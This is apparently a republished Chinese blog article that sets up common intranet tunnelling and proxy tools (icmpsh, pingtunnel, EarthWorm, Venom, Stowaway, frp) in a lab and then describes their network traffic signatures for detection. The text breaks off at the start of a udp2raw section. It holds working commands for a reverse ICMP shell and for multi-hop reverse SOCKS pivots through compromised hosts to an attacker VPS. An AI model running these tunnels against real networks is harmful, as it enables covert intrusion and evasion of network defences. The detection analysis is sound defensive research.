<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_h74gkETXPBEEeyqPKq9Bw)

**0x00 前言**
-----------

记录一下对内网代理和穿透工具的分析过程，着重在流量侧。

**0x01 环境**
-----------

攻击机器：192.168.1.131 和 192.168.1.133

目标机器：192.168.1.137

目标机器为双网卡，第二层网段为 192.168.3.0

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwAicQMcr2xcQIYKWCvr3avJicaial9CE5ic8dwgBm2LR2660aJlBMsgM4OA/640?wx_fmt=png)

**0x02 分析**
-----------

思路：网络层 -> 传输层 -> 应用层

### **1、ICMP 隧道技术**

icmpsh

*   介绍
    
    icmpsh 是一个简单的反向 ICMP shell 工具。与其他类似的开源工具相比，主要优势在于它不需要管理权限即可在目标机器上运行。  
    客户端只能在 Windows 机器运行，服务端可以在任何平台上运行。
    
*   下载
    
    https://github.com/bdamele/icmpsh
    
*   使用
    

服务端：

```
git clone https://github.com/inquisb/icmpsh.git

#关闭icmp回复,如果要开启icmp回复，该值设置为0
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#运行，第一个IP是VPS的eth0网卡IP，第二个IP是目标机器出口的公网IP
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
python2 -m pip install impacket
python2 icmpsh_m.py 192.168.1.133 192.168.1.137
```

客户端：  

```
-t 主机ip地址以发送ping请求。这个选项是强制性的！
-r 发送一个包含字符串“Test1234”的测试icmp请求，然后退出。
-d 毫秒请求之间的延迟（毫秒）
-o 毫秒响应超时（毫秒）。如果没有及时收到回复，从机将增加空白计数器。如果该计数器达到某个极限，从机将退出。如果收到响应，计数器将设置回0。
-b 空白数量限制（退出前未答复的icmp请求）
-s 字节最大数据缓冲区大小（字节）

icmpsh.exe -t 192.168.1.133 -d 500 -b 30 -s 128
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw01PkPRcbuxZOT78roEpDfCJLW6bkEX6795skTCsKeIOjqYCia3ejI6w/640?wx_fmt=png)

pingtunnel

*   介绍
    
    Pingtunnel 是一种通过 ICMP 发送 TCP/UDP 流量的工具。其是最流行的一款 ICMP 代理工具，提供对 tcp/udp/sock5 流量伪装成 icmp 流量进行转发的功能。需要 root 或者 administrator/system 权限。
    
*   下载
    
    https://github.com/esrrhs/pingtunnel
    
*   使用
    

高权限条件下

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwuAdUWkic0M5dNziaEGhWFs8Wibt2lFE5x14tCyHqsnoQmIIQb8NMw609Q/640?wx_fmt=png)

构建反向代理

1）服务端

```
-type server 代表开启ICMP SERVER端，等待客户端进行连接与通信。
-noprint 1 不在控制台打印日志
-nolog 1 不存储日志文件

echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all

./pingtunnel -type server -noprint 1 -nolog 1
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw2ibbAjsK5QhSFDT6Ttkz6bibn3gnR7bXtOuicXdWNpa5NSB0bib23FCkqQ/640?wx_fmt=png)

2）客户端

```
pingtunnel.exe -type client -l :4455 -s 192.168.1.133 -sock5 1 -noprint 1 -nolog 1
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcweCof6UUoHThsjhe68Op9MFKRL19ylMUDKXpZ0S2BoUfnxqCHygXrNw/640?wx_fmt=png)

3）测试使用

设置 socks5

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwthdfIvoTNSneicKT231dcPteB8a7K6O8TLYOJI1Zt0nnkfSbwpQwgpQ/640?wx_fmt=png)

访问二层网络

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwt37KzrrHpeAB5Da2qv9ov4o3I4ciaKSYtMgrQVQzt9vBTf8z77USt0Q/640?wx_fmt=png)

### **2、ICMP 隧道流量特征**

正常情况下，单位时间内数据包发送的数量为一组。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw7fDtbU1sVCvzOlUicic6KnzB6R0FY9wAuQib5uZhvQwz31AIrhib9ibmXKQ/640?wx_fmt=png)

单组数据包 Data 字段长度，Windows 为 32 bytes，Linux 下为 48 bytes，并且请求包和响应包长度相同。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwOElyknmC2Edzhubwk41LLADNbib72Q5ZYl2uQdzEqEGSiceCq96Hq0oQ/640?wx_fmt=png)

单组数据包 Data 字段内容中，Windows 为 abcdefghijklmnopqrstuvwabcdefghi，Linux 下为!”#$%&’()+,-./01234567。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwAU1zicMGewfg5Dk4zkDQoYsRHCb0aKqQYTvl2cj2iczia2KIicm6IlJSMg/640?wx_fmt=png)

数据包 Type 字段类型为 0 或者 8，表示请求和应答。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw0xHHjMFxfVL3GEqfR86v3uFv115epndfrfAIKiavic888DJwWIknQWrw/640?wx_fmt=png)

在 icmpsh 中，其交互过程的数据包中请求包和响应包长度明显不相同，并且 Data 字段内容明显为明文的敏感信息。

建立连接

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwOaU4cYoZJ03EgCdibOPgTLRzYMOibWdjwpJibux4bLt7RT5reJLRnUXrA/640?wx_fmt=png)

执行命令过程

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwW7Ka0QZw06T39ECLFzl67ibiagGv4Q7wuqeab4blicT5p4PGticEgq0QSg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwvXdWheibCaibmGic5rZxLwJG2XuMGMrHgcC53SSKFEudqjhuoKFDLAOJA/640?wx_fmt=png)

在 pingtunnel 中，明显地，单位时间内数据包的数量过大。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw7X2kTItCEBdickFW7kSicw3fz5jrjGVVsFhoyUpJLicITjKo7Vqzv4SWA/640?wx_fmt=png)

单组数据包 Data 字段长度非默认长度，并且请求和应答报文的长度也不相同。在单组数据包 Data 字段内容中，在交互过程存在会话 key 和明文访问信息。

pingtunnel 在访问过程会把会话 key 和访问信息封装到 icmp 协议的 data 字段中。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwDaPsBE4FdrYuPPQYiaf5CgYNibfE1GUfeLA99jQKUpia8nQOibibGl6B5JQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwPCRsdhmf7w1icjdsEm2EVPiayvRicz1SaeETlsic3a7PPMtlYHs7ibEr8uQ/640?wx_fmt=png)

流量检测关键点：

*   单位时间内数据包的数量
    
*   单组数据包 Data 字段长度
    
*   单组数据包 Data 字段内容
    

### **3、TCP 隧道技术**

EarthWorm

*   介绍
    
    EW 是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。  
    能够以 “正向”、“反向”、“多级级联” 等方式打通一条网络隧道，直达网络深处。
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwBNsFqFUxv3k3IuSQ67VKhN0WuxYSnaweAMYdxmE4qScy34icQP90Bfg/640?wx_fmt=png)
    
*   下载
    
    https://github.com/rootkiter/EarthWorm
    
*   使用
    

```
EW共有6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）
ssocksd:正向代理、rcsocks:流量转发、rssocks:socks5反弹
lcx_slave:端口绑定、lcx_listen:流量转发、lcx_tran:端口转发

lcx_slave 该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。
lcx_tran 该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。
lcx_listen该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。
通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。

-l 为服务启动打开一个端口。
-d 设置反弹主机地址。
-e 设置反弹端口。
-f 设置连接主机地址。
-ｇ连接端口设置连接端口。
-t 设置超时的毫秒数。默认值值是1000
```

1）反向 socks5 代理

客户端

```
ew.exe -s rssocks -d 192.168.1.131 -e 8888
```

服务端

```
ew.exe -s rcsocks -l 1080 -e 8888
```

测试结果  

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwZT88yspYTibhIuRG4FQjJ7sn5VqU5KHzuC518lxd4jeQsRLZNEfaU9w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwnIsa7Q9ZlNof8Qxd2jicc6m5vibgpuT51KicSGLNrO1gbaSIEWzhGueCw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwUrU0bpaIiaGWrP2UOlDj6eib0wr7K3MEiabOuWP2DOymUPKiaWLic0Wzcibw/640?wx_fmt=png)

2）二级级联

获得目标网络内两台主机 A(2.2.2.2)、B(2.2.2.3) 的权限。

A 主机存在公网 IP，且自由监听任意端口，无法访问特定资源。  
B 主机是目标网络内部主机，可访问特定资源，但无法访问公网。

A 主机可直连 B 主机。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwSE8wsnNBDibzI0YpmM6mdwfwibpEF7IwgQYwoOzibHqJibHb9lEXonaoiaA/640?wx_fmt=png)

```
主机A
ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 8888

主机B
ew -s ssocksd -l 8888

通过proxifier代理工具访问2.2.2.2:1080
```

主机 A(2.2.2.2)、B(2.2.2.3)，公网 VPS(1.1.1.1)。  

A 主机，无公网 IP，无法访问特定资源，可访问外网。

B 主机是内部主机，可访问特定资源，却无法回连公网。

A 主机可直连 B 主机。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwCY0USW1S6DNibSkKH1X7CVhECyTzECo0gCf6BdFVUjVoHaUbOhyH8vA/640?wx_fmt=png)

```
公网主机
ew -s lcx_listen -e 8888 -l 1080

A主机
ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999

B主机
ew -s ssocksd -l 9999

通过proxifier代理工具访问1.1.1.1:1080
```

3）多级级联

主机 A(2.2.2.2)、B(2.2.2.3)、C(2.2.2.4)，公网 VPS(1.1.1.1)。

A 主机无公网 IP，无法访问特定资源，可访问外网。  
B 主机无法访问特定资源，无法回连公网。  
C 主机可访问特定资源，无法回连公网。  
A 主机可直连 B 主机，B 主机可直连 C 主机。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwiagqfXvPlpRXNpCfo2vDcnSG4KpqZeCNZr9fwngKffEAwOrP5zCLgOg/640?wx_fmt=png)

```
VPS
ew -s rcsocks -l 1080 -e 8888

主机A
ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999

主机Ｂ
ew -s lcx_listen -l 9999 -e 7777

主机C
ew -s rssocks -d 2.2.2.3 -e 7777

通过proxifier代理工具访问1.1.1.1:1080
```

数据流向为 socks5 代理 -> 1080 -> 8888 -> 9999 -> 7777 -> rssocks  

Venom

*   介绍
    

Venom 是一款为渗透测试人员设计的使用 Go 开发的多级代理工具。

Venom 可将多个节点进行连接，然后以节点为跳板，构建多级代理。

渗透测试人员可以使用 Venom 轻松地将网络流量代理到多层内网，并轻松地管理代理节点。

其功能特性支持：多级 socks5 代理、多级端口转发、端口复用 (apache/mysql/…)、ssh 隧道、节点间通信加密

*   下载
    
    https://github.com/Dliv3/Venom/
    
*   使用
    

1）未加密下的反向 socks5 代理

服务端

```
admin.exe -lport 9999
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw2aloElFLa6sghnxNbvP98tUj27vaiamv5FMIWnvn938twOJiaSsZHdSg/640?wx_fmt=png)

客户端

```
agent.exe -rhost 192.168.1.131 -rport 9999
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwyKy8WpWicllmzSD6Ye1ExAE5fpjGaYtic1WEQKm19mNjbcIVkJCGM2yg/640?wx_fmt=png)

2）加密下的反向 socks5 代理

```
admin.exe -lport 9999 -passwd dlive@dubhe
agent.exe -rhost 192.168.1.131 -rport 9999 -passwd dlive@dubhe
```

3）多级级联  

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwDic4MwgJrmQ9Se4n585asJic4bFAcOwyrIySQ69rkfG2r06l8UiaDHt4w/640?wx_fmt=png)

```
VPS:120.10.120.X
admin_linux_x64 -lport 4343 -passwd test@123
goto 1
listen 4343
goto 2
listen 4343

主机A:192.168.3.15
agent.exe -rhost 120.10.120.X -rport 4343 -passwd test@123

主机B:192.168.3.30
agent.exe -rhost 192.168.3.15 -rport 4343 -passwd test@123

主机C:192.168.3.160
agent.exe -rhost 192.168.3.30 -rport 4343 -passwd test@123
```

Stowaway

*   介绍
    

Stowaway 是一个利用 go 语言编写、专为渗透测试工作者制作的多级代理工具。用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并轻松实现管理功能。

其功能特性支持：节点间正向 / 反向连接、节点间支持重连、节点间可通过 socks5 代理进行连接、节点间可通过 ssh 隧道连接、节点间流量可选择 TCP/HTTP、多级 socks5 流量代理转发, 支持 UDP/TCP,IPV4/IPV6、节点支持 ssh 访问远程主机、远程 shell、上传及下载文件、端口本地 / 远程映射、节点可端口复用、自由开关各类服务、节点间相互认证、节点间流量以 AES-256-GCM 进行加密。

*   下载
    
    https://github.com/ph4ntonn/Stowaway
    
*   使用
    

1）未加密下反向代理

服务端

```
stowaway_admin -l 9999
use 0 
socks 10001
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwgHjyZX4rYCDico5ryYBtSuQzH0ENuRE7eJDtEGYvHI9bBmN01aM6O7Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw2gJ7L4xCxg3Ft9JnYjMS2LmHK8zHVMRdWCaCL9BrWWKafYtMh9p44Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwMGZZMfXVkhnGM1tyicw7u2R5ibaxgC3gWPWMFffLEruFwmsASiaZnQibYg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwHgHDjrJWnJGXmQLsEYZ46rMpWtwCcBpErDBkAfm5cn5aic823ibibGOqQ/640?wx_fmt=png)

客户端

```
stowaway_agent -c 192.168.1.131:9999
```

**![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwgKicohut9Sxd8MwO8icuXT6KNLbBmX2ia6DHOLXbO9xMoOU6VfYxdMIOQ/640?wx_fmt=png)**

2）加密下反向代理

```
stowaway_admin -l 9999 -s test@123
stowaway_agent -c 192.168.1.131:9999 -s test@123
```

3）多级级联

```
在stowaway中，组成多级网络需要借助admin中的listen、connect、 sshtunnel命令来实现

admin: 
./stowaway_admin -l 9999 -s 123

agent-1: 
./stowaway_agent -c 127.0.0.1:9999 -s 123

agent-2: 
./stowaway_agent -l 10000 -s 123
通过admin,输入use 0 -> connect agent-2的IP:10000来将其加入网络，并成为agent-1的一个子节点

agent-3: 
./stowaway_agent -c 127.0.0.1:10001 -s 123
通过admin,输入use 0 -> listen -> 选择1.Normal Passive -> 输入10001 从而使得agent-1监听在10001端口上，并等待子节点的连接
```

Frp

*   介绍
    

frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。

其功能特性支持：支持 TCP、KCP 以及 Websocket 等多种协议; 采用 TCP 连接流式复用，在单个连接间承载更多请求，节省连接建立时间; 代理组间的负载均衡; 端口复用，多个服务通过同一个服务端端口暴露; 多个原生支持的客户端插件（静态文件查看，HTTP、SOCK5 代理等）。

*   下载
    
    https://github.com/fatedier/frp
    
*   使用
    

1）正常使用

客户端

```
[common]
server_addr = 192.168.1.131
server_port = 7000
token = test@123

[socks5]
type = tcp
local_ip = 192.168.3.73
remote_port = 1081
plugin = socks5
plugin_user = test
plugin_passwd = 123
use_encryption = true
use_compression = true
```

服务端

```
[common]
bind_port = 7000
token = test@123
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw14P2XhmAjSBxOw4OCAYXWibyP1OSibqpXuUGibhHRg3zJyF20WcKKRq9w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwNticIXcGzKszbNgicPzeNJ2FqUqc1R0kAniclbOiciaWibiaGxDMtlApd04ZA/640?wx_fmt=png)

2）多级级联

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwOOWuW2wpgkDEwNp72VZyNXTmU6QvBCicCd8Q2OZXYQuED3cElVsSUBg/640?wx_fmt=png)

```
1、黑客VPS
#frpc.ini
[common]
bind_addr = 0.0.0.0
bind_port = 7099

2、外网web服务器
#frpc.ini
[common]
server_addr = 192.168.27.157
server_port = 7000
[proxy]
type = tcp
local_ip = 10.10.3.100
local_port = 9999
remote_port = 9999
plugin = socks5

#frps.ini
[common]
bind_addr = 10.10.3.100
bind_port = 7000

3、内网域控
#frpc.ini
[common]
server_addr = 10.10.3.100
server_port = 7000
[proxy]
type = tcp
local_ip = 10.10.21.5
local_port = 9999
remote_port = 9999
plugin = socks5

#frps.ini
[common]
bind_addr = 10.10.21.5
bind_port = 7000

4、财务子域控制器
#frpc.ini
[common]
server_addr = 10.10.21.5
server_port = 7000
[proxy]
type = tcp
remote_port = 9999
plugin = socks5
```

最后通过 proxifier 将流量带入内网

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwSf5IQ681FIFiafOicsewgKbT6AibzJLQI303b5RsBxkfIqxlNfoGicxUbw/640?wx_fmt=png)

### **4、TCP 隧道流量特征**

EarthWorm

ew 在建立连接的过程中，数据包存在额外的数据特征 “xx xx 00 00 00 00”

客户端发送 “01 01 00 00 00 00”

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwDvnmEx4QNP7MSCFzAeXvGs2LfhG37hoxAPRK3sJMIGOuPTb26PLkEw/640?wx_fmt=png)

服务端应答 “01 02 00 00 00 00”，建立连接。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwfKdX87Vf2P59jBgUBHPBGkM2IFgmRhWucnRlbVSup5LcWlknp0742w/640?wx_fmt=png)

Venom

未加密下 venom 在建立连接过程的过程中会先发起系列”00 00 00 00 00 00“

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwXAbb4YqWH2s60PvqS7d2abR2CwKveSrTavMhciaDuJJWNdic5aRJVmibA/640?wx_fmt=png)

接着通过携带 “ABCDEFGH”，来判断是否为 venom 协议

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwqCHc5IsRTV4r6iamaP3oGZK1IkZlZn0Hqp7qicaK42vr2BLtU6ibNkT6g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwJQcF5LDjWXgMU0M8BKc4HBoT4aPNmoopvosAibWSbGtFn1o8wibEvtJQ/640?wx_fmt=png)

同时，通过携带 “VCMD”，作为协议的数据分割

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw5xRou6KWd32jiaMibhvMQEWDvb3TdQ5icTkK5zqUsbVpiax1TibIIiakddoA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwqbq9rCRqP8p0I9IUsmibDiaCQgYjBGJb2PgxLgjxwHxxs6Hib5Dj5F2aQ/640?wx_fmt=png)

执行命令过程也为明文信息

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwJ3Z2Hp3UF7pa1R6VWENCibdBiaJv1WAy9CT7MN532QemdAsaBI2Cco7A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwymALswmt0CaBoZawY72z02s06zIGicrNs30BSfvIXe3hCA1YiaAozC0A/640?wx_fmt=png)

使用 venom 的加密下，只存在较小的特征，如携带的数据全置零

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwFLMNNogJwwjCR6VIdg6uXDzbZhsiaUJ0tkSKyt0iczq6TRr1CtpkXLibQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwwjCfhwunt0SyS3Tf8F8Se9AIqgFg5vhVv6cSStQOSnAlfQoNcenM5A/640?wx_fmt=png)

推测，其在只有在不使用端口复用时候，才存在

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw4cKyvUVB4GLGNBHhzh3P9pjYTrBq4lPNVdd1Zqfp7X3DDRnb944v4Q/640?wx_fmt=png)

Stowaway

加密和未加密情况下，除了部分数据加密外，特征并没有发生变化。

stowaway 在建立连接过程的过程中客户端会先发起系列”00 00 00 00 00 00“

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwyoBOMccO7LWc9CDV7DQ70ia0TrzJib1ibBjOcq3ooaWQHNrzxwdFmQLJw/640?wx_fmt=png)

随后，客户端继续携带生成的 “会话 key”，向服务端发起请求

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw744GcicyUmcXWUCS6eY8RlADU7TEtiaYAeKPILHvERPZhnSwqOJOQm7w/640?wx_fmt=png)

在服务端确认相同的 “会话 key” 后，客户端发起请求管理端的信息

```
const ADMIN_UUID = "IAMADMINXD"
const TEMP_UUID = "IAMNEWHERE"
const TEMP_ROUTE = "THEREISNOROUTE"
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwklZr2cLctAlZI2ZEnYdUibgdCNT0ZXboLthTMezIW0BplS17ndTdHzg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwKjibSImpguwl8cHklk5DB4BcvnDnicOUGiaRm1ETS7gbbBYeSnxb2BQ0g/640?wx_fmt=png)

服务端回复确认后，建立连接

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwG2VufWDNCLGXzHuEX8ibcDgB1OpZrxzze89tzIwAq4d6Sq4LR0yN3icw/640?wx_fmt=png)

由于未加密，存在明文信息

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwIhjfibJRy7oicDX5UUgYF6aJic88xs40IRDsUjnicCj0v2E56oV4FgxZlQ/640?wx_fmt=png)

在建立连接后，伴随着大量重复 ACK 确认请求，怀疑是做心跳保持？

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw0GQneOScOlBq7OsAqNA1tCUIh1CKaya32FkD7I4IDRIhHNDem2BkBg/640?wx_fmt=png)

Frp

1）未添加 tls 加密下的 frp

客户端

```
[common]
server_addr = 192.168.1.131
server_port = 7000
token = test@123

[socks5]
type = tcp
local_ip = 192.168.3.73
remote_port = 1081
plugin = socks5
plugin_user = test
plugin_passwd = 123
use_encryption = true
use_compression = true
```

服务端  

```
[common]
bind_port = 7000
token = test@123
```

客户端携带版本架构等信息向服务端发起请求

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwTZ4Buk8IHvMRcG4M0huN8kXLprjlFxKUorIsQ9VGKkhokQgz1fGU6A/640?wx_fmt=png)

服务端回应相关信息

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwKiaAsmWZx8D7ywmOyI0bzE707G7OHFALcU4T4kVRicFP8T4icLX3kAWmQ/640?wx_fmt=png)

客户端和服务端之间传递会话 id 和会话 key

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwvZMsAM2urabWjhVnfm9JjibpNjaK97NEvVIKw6YZc6GqIOHoaibjw9gw/640?wx_fmt=png)

服务端创建 socks5 信息

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwADgvTkX04MiaWKVtb4lh8XtUia3g5Wtn9biaswCaM1MmZjiaZHbRadUlFA/640?wx_fmt=png)

由于进行了加密和压缩，报文的 data 是加密的

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwkLcWpJUXMicMHdggnWlLmIwfzkLYCSDe9HwVaO5RSDibADyk4SIHt6Aw/640?wx_fmt=png)

2）添加了 tls 加密后的 frp

客户端

```
[common]
server_addr = 192.168.1.131
server_port = 7000
token = test@123
tls_enable = true

[socks5]
type = tcp
local_ip = 192.168.3.73
remote_port = 1081
plugin = socks5
plugin_user = test
plugin_passwd = 123
use_encryption = true
use_compression = true
```

服务端

```
[common]
bind_port = 7000
token = test@123
```

添加了 tls 和加密压缩后的 frp 在通信过程已经没有了版本信息和会话信息。不过，在建立连接的过程启用 tls 前，客户端携带 “0x17”, 请求服务端

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwP7ZYLous0yk3RVR1P2yiaNKHUrGZmh3ibACfU2buficzbpbUbnOFWKLrg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwVve0WOUy8mHDKv1icEYJ9CQMKbReVTByfcSs74LTiayCYIfm9ru35XHw/640?wx_fmt=png)

利用 wireshark 详细分析，发现 wireshark 识别该报文为 “Gryphon” 协议，“Gryphon”协议为工控协议，用于车用通讯协定

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwOhTDxZHLXQmj4ict1dZus6IPI5YWhulUFAMImU3tpdUsDGkHsmqtp8Q/640?wx_fmt=png)

随后，以固定的 243 字节的 TLS-hello 报文向服务端发起请求

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwcEXTbzEEVm9Zic56r5ibsOYWYB0xLlAHLKaicz2YXQEcOB1r3xSt6icT0Q/640?wx_fmt=png)

固定 243 字节长度的 hello 报文告诉服务端，frp 支持的一系列加密算法套件

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwOBTA1pI3RZoXLe4EqkzpPKicFP57Dia3dlUqprKWW0d9El6E34iac9FUQ/640?wx_fmt=png)

服务端选定加密算法，理论上也是 90 字节大小的 TLS-hello 报文，向客户端发起应答

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwNicTKgF4B6CPCQMVlTGTR4Mj1qsfZKmC3q97bSKQ4tLGZianBcDzFiavg/640?wx_fmt=png)

随后完成协商过程，建立 tls 加密通信

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwWfMZtziaZBiafTKXibzImJVWTJ3NtSwBX8Psl9icy7ETHdLWoZlnchIgUg/640?wx_fmt=png)

### **5、UDP 隧道技术**

Udp2raw

*   介绍
    

该工具可以利用原始套接字并通过伪造的 TCP/UDP/ICMP 流量来帮助研究人员绕过 UDP 防火墙（或不稳定的 UDP 环境）。

其支持心跳保活、自动重连，重连后会恢复上次连接，在底层掉线的情况下可以保持上层不掉线。同时有加密、防重放攻击、信道复用的功能。

*   下载
    

 https://github.com/wangyu-/udp2raw

*   使用
    

```
在server端运行:
